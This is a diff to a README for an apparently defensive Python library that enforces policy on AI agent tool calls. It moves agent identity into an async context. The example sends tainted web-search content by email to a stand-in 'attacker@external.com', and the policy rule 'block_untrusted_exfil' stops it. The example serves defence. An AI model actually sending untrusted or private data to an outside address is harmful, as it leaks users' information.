@@ -16,12 +16,12 @@ pip install interbolt
 ```
 
 ```python
-from interbolt import configure, taint, Policy, PolicyViolation, Tainted
+from interbolt import configure, guard, taint, Policy, PolicyViolation, Tainted
+import asyncio
 
 runtime = configure(policy=Policy.from_file("policy.yaml"))
-agent = runtime.agent("support-agent")
 
-@agent.guard
+@guard
 def send_email(to: str, body: str) -> None:
     ...
 
@@ -31,11 +31,16 @@ def send_email(to: str, body: str) -> None:
 summary: Tainted = taint(web_search("..."), source="web_search")
 
 # body: str accepts the Tainted str; the policy still sees the provenance label
-# at the call boundary.
-try:
-    send_email(to="attacker@external.com", body=summary)
-except PolicyViolation as e:
-    print(e.decision.matched_rule)   # "block_untrusted_exfil"
+# at the call boundary. agent_context binds the acting agent's identity for
+# guarded calls made inside the block.
+async def main() -> None:
+    async with runtime.agent_context("support-agent"):
+        try:
+            send_email(to="attacker@external.com", body=summary)
+        except PolicyViolation as e:
+            print(e.decision.matched_rule)   # "block_untrusted_exfil"
+
+asyncio.run(main())
 ```
 
 Generate a starter policy with `interbolt init`, then check it in CI with `interbolt validate policy.yaml`. If you call `configure()` without a policy, interbolt uses a built-in default-deny posture (no sources, no sinks, every call requires approval) and logs a warning pointing to `interbolt init`.
